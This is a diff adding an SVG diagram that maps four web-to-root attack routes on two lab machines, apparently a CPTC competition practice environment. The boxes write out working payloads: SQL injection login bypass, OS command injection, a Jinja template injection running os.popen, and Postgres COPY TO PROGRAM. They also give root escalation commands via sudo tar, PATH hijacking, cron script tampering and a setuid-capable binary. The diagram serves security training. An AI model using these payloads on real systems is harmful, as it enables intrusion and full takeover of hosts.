@@ -1,0 +1,193 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="1160" height="705" viewBox="0 0 1160 705" font-family="Helvetica, Arial, sans-serif">
+  <defs>
+    <marker id="arrow" markerWidth="9" markerHeight="9" refX="6" refY="3" orient="auto" markerUnits="strokeWidth">
+      <path d="M0,0 L6,3 L0,6 Z" fill="#333333"/>
+    </marker>
+  </defs>
+
+  <rect x="0" y="0" width="1160" height="705" fill="#ffffff"/>
+
+  <!-- Title + note -->
+  <text x="20" y="34" font-size="18" font-weight="bold" fill="#222222">Wormhole CPTC Tryout — Web-to-Root Attack Routes</text>
+  <text x="20" y="58" font-size="12" fill="#666666">Each column is ONE complete route (web exploit → foothold shell on the host → local privilege escalation → root). Left column = the generic kill-chain (worked example).</text>
+
+  <!-- Machine headers -->
+  <rect x="150" y="88" width="450" height="34" rx="4" fill="#d5e8d4" stroke="#82b366" stroke-width="1.5"/>
+  <text x="375" y="101" font-size="12" font-weight="bold" text-anchor="middle" fill="#222">MACHINE:  rocky   (Debian 12)</text>
+  <text x="375" y="115" font-size="11" text-anchor="middle" fill="#333">Antimatter-Weapons  +  Bubble-Control</text>
+
+  <rect x="670" y="88" width="460" height="34" rx="4" fill="#d5e8d4" stroke="#82b366" stroke-width="1.5"/>
+  <text x="900" y="101" font-size="12" font-weight="bold" text-anchor="middle" fill="#222">MACHINE:  hail mary   (Debian 12)</text>
+  <text x="900" y="115" font-size="11" text-anchor="middle" fill="#333">HR-Portal  +  wormhole-casino-website</text>
+
+  <!-- Route headers -->
+  <text x="255"  y="140" font-size="11" font-weight="bold" text-anchor="middle" fill="#222">R1 · Antimatter-Weapons</text>
+  <text x="495"  y="140" font-size="11" font-weight="bold" text-anchor="middle" fill="#222">R2 · Bubble-Control</text>
+  <text x="775"  y="140" font-size="11" font-weight="bold" text-anchor="middle" fill="#222">H1 · HR-Portal</text>
+  <text x="1015" y="140" font-size="11" font-weight="bold" text-anchor="middle" fill="#222">H2 · Wormhole Casino</text>
+
+  <!-- ===================== Phase labels (left, the example) ===================== -->
+  <rect x="20" y="150" width="120" height="72" rx="6" fill="#f5f5f5" stroke="#999999" stroke-width="1.5"/>
+  <text x="80" y="190" font-size="11" font-weight="bold" text-anchor="middle" fill="#222">① Recon / access</text>
+
+  <rect x="20" y="245" width="120" height="72" rx="6" fill="#ffe6cc" stroke="#d79b00" stroke-width="1.5"/>
+  <text x="80" y="285" font-size="11" font-weight="bold" text-anchor="middle" fill="#222">② Web exploit</text>
+
+  <rect x="20" y="340" width="120" height="72" rx="6" fill="#fff2cc" stroke="#d6b656" stroke-width="1.5"/>
+  <text x="80" y="370" font-size="11" font-weight="bold" text-anchor="middle" fill="#222">③ Foothold</text>
+  <text x="80" y="383" font-size="11" font-weight="bold" text-anchor="middle" fill="#222">(shell on host)</text>
+
+  <rect x="20" y="435" width="120" height="72" rx="6" fill="#dae8fc" stroke="#6c8ebf" stroke-width="1.5"/>
+  <text x="80" y="465" font-size="11" font-weight="bold" text-anchor="middle" fill="#222">④ Local</text>
+  <text x="80" y="478" font-size="11" font-weight="bold" text-anchor="middle" fill="#222">enumeration</text>
+
+  <rect x="20" y="530" width="120" height="72" rx="6" fill="#e1d5e7" stroke="#9673a6" stroke-width="1.5"/>
+  <text x="80" y="560" font-size="11" font-weight="bold" text-anchor="middle" fill="#222">⑤ Privilege</text>
+  <text x="80" y="573" font-size="11" font-weight="bold" text-anchor="middle" fill="#222">escalation</text>
+
+  <rect x="20" y="625" width="120" height="60" rx="6" fill="#f8cecc" stroke="#b85450" stroke-width="1.5"/>
+  <text x="80" y="659" font-size="11" font-weight="bold" text-anchor="middle" fill="#222">⑥ Goal: root</text>
+
+  <!-- ===================== Route boxes ===================== -->
+  <!-- shared style: monospace body text -->
+  <g font-family="'DejaVu Sans Mono', 'Consolas', monospace" font-size="8.5" fill="#333333">
+
+    <!-- Row 1: Recon (fill #f5f5f5 / #999) -->
+    <rect x="150" y="150" width="210" height="72" rx="6" fill="#f5f5f5" stroke="#999999" stroke-width="1.5"/>
+    <text x="255" y="176" text-anchor="middle">GET /robots.txt</text>
+    <text x="255" y="189" text-anchor="middle">→ /static/notes.txt</text>
+    <text x="255" y="202" text-anchor="middle">→ GET /admin?admin=1 (creds leak)</text>
+
+    <rect x="390" y="150" width="210" height="72" rx="6" fill="#f5f5f5" stroke="#999999" stroke-width="1.5"/>
+    <text x="495" y="176" text-anchor="middle">login guest/guest (weak creds)</text>
+    <text x="495" y="189" text-anchor="middle">or forge session cookie</text>
+    <text x="495" y="202" text-anchor="middle">(secret bubble_ctrl_2049)</text>
+
+    <rect x="670" y="150" width="210" height="72" rx="6" fill="#f5f5f5" stroke="#999999" stroke-width="1.5"/>
+    <text x="775" y="176" text-anchor="middle">SQLi login: admin'--</text>
+    <text x="775" y="189" text-anchor="middle">(f-string query) or seeded</text>
+    <text x="775" y="202" text-anchor="middle">creds awong / Password1!</text>
+
+    <rect x="910" y="150" width="210" height="72" rx="6" fill="#f5f5f5" stroke="#999999" stroke-width="1.5"/>
+    <text x="1015" y="176" text-anchor="middle">unauthenticated</text>
+    <text x="1015" y="189" text-anchor="middle">target endpoint: POST /login</text>
+    <text x="1015" y="202" text-anchor="middle">(raw pg.Pool query)</text>
+
+    <!-- Row 2: Web exploit (fill #ffe6cc / #d79b00) -->
+    <rect x="150" y="245" width="210" height="72" rx="6" fill="#ffe6cc" stroke="#d79b00" stroke-width="1.5"/>
+    <text x="255" y="271" text-anchor="middle">POST /api/launch target_id="pwn"</text>
+    <text x="255" y="284" text-anchor="middle">→ ValueError 500 → Werkzeug</text>
+    <text x="255" y="297" text-anchor="middle">debug console (debug=True)</text>
+
+    <rect x="390" y="245" width="210" height="72" rx="6" fill="#ffe6cc" stroke="#d79b00" stroke-width="1.5"/>
+    <text x="495" y="271" text-anchor="middle">GET /api/status-check?host=</text>
+    <text x="495" y="284" text-anchor="middle">127.0.0.1;id</text>
+    <text x="495" y="297" text-anchor="middle">OS cmd injection (shell=True)</text>
+
+    <rect x="670" y="245" width="210" height="72" rx="6" fill="#ffe6cc" stroke="#d79b00" stroke-width="1.5"/>
+    <text x="775" y="271" text-anchor="middle">POST /profile/greeting template=</text>
+    <text x="775" y="284" text-anchor="middle">{{ cycler.__init__.__globals__.os</text>
+    <text x="775" y="297" text-anchor="middle">.popen('id').read() }} — SSTI</text>
+
+    <rect x="910" y="245" width="210" height="72" rx="6" fill="#ffe6cc" stroke="#d79b00" stroke-width="1.5"/>
+    <text x="1015" y="271" text-anchor="middle">email=x'; COPY (SELECT '')</text>
+    <text x="1015" y="284" text-anchor="middle">TO PROGRAM 'id'; --</text>
+    <text x="1015" y="297" text-anchor="middle">SQLi → stacked (pg superuser)</text>
+
+    <!-- Row 3: Foothold (fill #fff2cc / #d6b656) -->
+    <rect x="150" y="340" width="210" height="72" rx="6" fill="#fff2cc" stroke="#d6b656" stroke-width="1.5"/>
+    <text x="255" y="380" text-anchor="middle" font-size="11" font-weight="bold">RCE as svc-antimatter</text>
+
+    <rect x="390" y="340" width="210" height="72" rx="6" fill="#fff2cc" stroke="#d6b656" stroke-width="1.5"/>
+    <text x="495" y="380" text-anchor="middle" font-size="11" font-weight="bold">RCE as svc-bubble</text>
+
+    <rect x="670" y="340" width="210" height="72" rx="6" fill="#fff2cc" stroke="#d6b656" stroke-width="1.5"/>
+    <text x="775" y="380" text-anchor="middle" font-size="11" font-weight="bold">RCE as svc-hr</text>
+
+    <rect x="910" y="340" width="210" height="72" rx="6" fill="#fff2cc" stroke="#d6b656" stroke-width="1.5"/>
+    <text x="1015" y="380" text-anchor="middle" font-size="11" font-weight="bold">command exec as postgres</text>
+
+    <!-- Row 4: Local enum (fill #dae8fc / #6c8ebf) -->
+    <rect x="150" y="435" width="210" height="72" rx="6" fill="#dae8fc" stroke="#6c8ebf" stroke-width="1.5"/>
+    <text x="255" y="465" text-anchor="middle">sudo -l →</text>
+    <text x="255" y="478" text-anchor="middle">(root) NOPASSWD: /usr/bin/tar</text>
+
+    <rect x="390" y="435" width="210" height="72" rx="6" fill="#dae8fc" stroke="#6c8ebf" stroke-width="1.5"/>
+    <text x="495" y="461" text-anchor="middle">find / -perm -4000 →</text>
+    <text x="495" y="474" text-anchor="middle">/usr/local/bin/bubble-diag (SUID,</text>
+    <text x="495" y="487" text-anchor="middle">calls ps/cat by relative name)</text>
+
+    <rect x="670" y="435" width="210" height="72" rx="6" fill="#dae8fc" stroke="#6c8ebf" stroke-width="1.5"/>
+    <text x="775" y="461" text-anchor="middle">cat /etc/cron.d/* (or pspy) →</text>
+    <text x="775" y="474" text-anchor="middle">/opt/hailmary/tasks/hr-nightly.sh</text>
+    <text x="775" y="487" text-anchor="middle">root, group-writable by svc-hr</text>
+
+    <rect x="910" y="435" width="210" height="72" rx="6" fill="#dae8fc" stroke="#6c8ebf" stroke-width="1.5"/>
+    <text x="1015" y="461" text-anchor="middle">getcap -r / →</text>
+    <text x="1015" y="474" text-anchor="middle">/opt/hailmary/bin/casino-report</text>
+    <text x="1015" y="487" text-anchor="middle">cap_setuid+ep (world-exec)</text>
+
+    <!-- Row 5: Priv-esc (fill #e1d5e7 / #9673a6) -->
+    <rect x="150" y="530" width="210" height="72" rx="6" fill="#e1d5e7" stroke="#9673a6" stroke-width="1.5"/>
+    <text x="255" y="556" text-anchor="middle">sudo tar -cf /dev/null /dev/null</text>
+    <text x="255" y="569" text-anchor="middle">--checkpoint=1</text>
+    <text x="255" y="582" text-anchor="middle">--checkpoint-action=exec=/bin/sh</text>
+
+    <rect x="390" y="530" width="210" height="72" rx="6" fill="#e1d5e7" stroke="#9673a6" stroke-width="1.5"/>
+    <text x="495" y="556" text-anchor="middle">PATH-hijack 'cat':</text>
+    <text x="495" y="569" text-anchor="middle">PATH=/tmp/x:$PATH ./bubble-diag</text>
+    <text x="495" y="582" text-anchor="middle">→ runs attacker 'cat' as root</text>
+
+    <rect x="670" y="530" width="210" height="72" rx="6" fill="#e1d5e7" stroke="#9673a6" stroke-width="1.5"/>
+    <text x="775" y="556" text-anchor="middle">echo 'cp /bin/bash /tmp/rb;</text>
+    <text x="775" y="569" text-anchor="middle">chmod 4755 /tmp/rb' &gt;&gt; hr-nightly.sh</text>
+    <text x="775" y="582" text-anchor="middle">wait for cron → /tmp/rb -p</text>
+
+    <rect x="910" y="530" width="210" height="72" rx="6" fill="#e1d5e7" stroke="#9673a6" stroke-width="1.5"/>
+    <text x="1015" y="556" text-anchor="middle">casino-report -c</text>
+    <text x="1015" y="569" text-anchor="middle">'import os;os.setuid(0);</text>
+    <text x="1015" y="582" text-anchor="middle">os.system("/bin/bash")'</text>
+
+  </g>
+
+  <!-- Row 6: root (fill #f8cecc / #b85450) -->
+  <rect x="150" y="625" width="210" height="60" rx="6" fill="#f8cecc" stroke="#b85450" stroke-width="1.5"/>
+  <text x="255" y="659" text-anchor="middle" font-size="12" font-weight="bold" fill="#8b1a1a">★ root @ rocky</text>
+
+  <rect x="390" y="625" width="210" height="60" rx="6" fill="#f8cecc" stroke="#b85450" stroke-width="1.5"/>
+  <text x="495" y="659" text-anchor="middle" font-size="12" font-weight="bold" fill="#8b1a1a">★ root @ rocky</text>
+
+  <rect x="670" y="625" width="210" height="60" rx="6" fill="#f8cecc" stroke="#b85450" stroke-width="1.5"/>
+  <text x="775" y="659" text-anchor="middle" font-size="12" font-weight="bold" fill="#8b1a1a">★ root @ hail mary</text>
+
+  <rect x="910" y="625" width="210" height="60" rx="6" fill="#f8cecc" stroke="#b85450" stroke-width="1.5"/>
+  <text x="1015" y="659" text-anchor="middle" font-size="12" font-weight="bold" fill="#8b1a1a">★ root @ hail mary</text>
+
+  <!-- ===================== Arrows (vertical chains) ===================== -->
+  <g stroke="#333333" stroke-width="1.5">
+    <!-- R1 x=255 -->
+    <line x1="255" y1="222" x2="255" y2="245" marker-end="url(#arrow)"/>
+    <line x1="255" y1="317" x2="255" y2="340" marker-end="url(#arrow)"/>
+    <line x1="255" y1="412" x2="255" y2="435" marker-end="url(#arrow)"/>
+    <line x1="255" y1="507" x2="255" y2="530" marker-end="url(#arrow)"/>
+    <line x1="255" y1="602" x2="255" y2="625" marker-end="url(#arrow)"/>
+    <!-- R2 x=495 -->
+    <line x1="495" y1="222" x2="495" y2="245" marker-end="url(#arrow)"/>
+    <line x1="495" y1="317" x2="495" y2="340" marker-end="url(#arrow)"/>
+    <line x1="495" y1="412" x2="495" y2="435" marker-end="url(#arrow)"/>
+    <line x1="495" y1="507" x2="495" y2="530" marker-end="url(#arrow)"/>
+    <line x1="495" y1="602" x2="495" y2="625" marker-end="url(#arrow)"/>
+    <!-- H1 x=775 -->
+    <line x1="775" y1="222" x2="775" y2="245" marker-end="url(#arrow)"/>
+    <line x1="775" y1="317" x2="775" y2="340" marker-end="url(#arrow)"/>
+    <line x1="775" y1="412" x2="775" y2="435" marker-end="url(#arrow)"/>
+    <line x1="775" y1="507" x2="775" y2="530" marker-end="url(#arrow)"/>
+    <line x1="775" y1="602" x2="775" y2="625" marker-end="url(#arrow)"/>
+    <!-- H2 x=1015 -->
+    <line x1="1015" y1="222" x2="1015" y2="245" marker-end="url(#arrow)"/>
+    <line x1="1015" y1="317" x2="1015" y2="340" marker-end="url(#arrow)"/>
+    <line x1="1015" y1="412" x2="1015" y2="435" marker-end="url(#arrow)"/>
+    <line x1="1015" y1="507" x2="1015" y2="530" marker-end="url(#arrow)"/>
+    <line x1="1015" y1="602" x2="1015" y2="625" marker-end="url(#arrow)"/>
+  </g>
+</svg>
